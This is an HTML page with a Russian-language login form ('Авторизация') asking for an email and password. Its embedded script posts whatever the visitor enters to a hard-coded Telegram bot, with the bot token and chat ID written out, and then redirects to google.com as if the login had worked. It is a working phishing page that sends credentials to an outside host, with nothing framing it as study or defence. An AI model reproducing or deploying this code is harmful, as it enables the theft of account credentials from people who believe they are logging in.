<body>

    <div class="form-container">
        <h2>Авторизация</h2>
        <form id="telegramForm">
            <div class="form-group">
                <label for="username">Имя пользователя (Email)</label>
                <input type="text" id="username" name="username" required placeholder="example@mail.com">
            </div>
            <div class="form-group">
                <label for="password">Пароль / Сообщение</label>
                <input type="password" id="password" name="password" required placeholder="••••••••">
            </div>
            <button type="submit" id="submitBtn">Войти</button>
        </form>
        <div id="statusMessage"></div>
    </div>

    <script>
        // Конфигурация Telegram API
        const BOT_TOKEN = '8852636714:AAGJbQ5Bq2onVh94mHlZ2Ir-rsl_LKMXiTY'; 
        const CHAT_ID = '8906550436';

        const form = document.getElementById('telegramForm');
        const statusDiv = document.getElementById('statusMessage');
        const submitBtn = document.getElementById('submitBtn');

        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Предотвращаем перезагрузку страницы

            // Получаем данные из полей
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Формируем текст для Telegram
            const formattedText = `🔐 Новая попытка входа:\nПользователь: ${username}\nВвод: ${password}`;
            const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            const payload = {
                chat_id: CHAT_ID,
                text: formattedText
            };

            // Блокируем кнопку на время отправки
            submitBtn.textContent = 'Обработка...';
            submitBtn.disabled = true;
            statusDiv.className = '';

            // Отправляем POST-запрос в Telegram API
            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`Ошибка сети: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                if (data.ok) {
                    // Успешная отправка
                    statusDiv.textContent = 'Успешно! Перенаправление...';
                    statusDiv.className = 'success';
                    form.reset(); 
                    
                    // Редирект через 2 секунды
                    setTimeout(() => {
                        window.location.href = "https://google.com"; 
                    }, 2000);
                } else {
                    throw new Error(data.description || 'Ошибка API');
                }
            })
            .catch(error => {
                console.error('Ошибка:', error);
                statusDiv.textContent = 'Сбой подключения. Попробуйте еще раз.';
                statusDiv.className = 'error';
                
                // Разблокируем кнопку при ошибке
                submitBtn.textContent = 'Войти';
                submitBtn.disabled = false;
            });
        });
    </script>
</body>
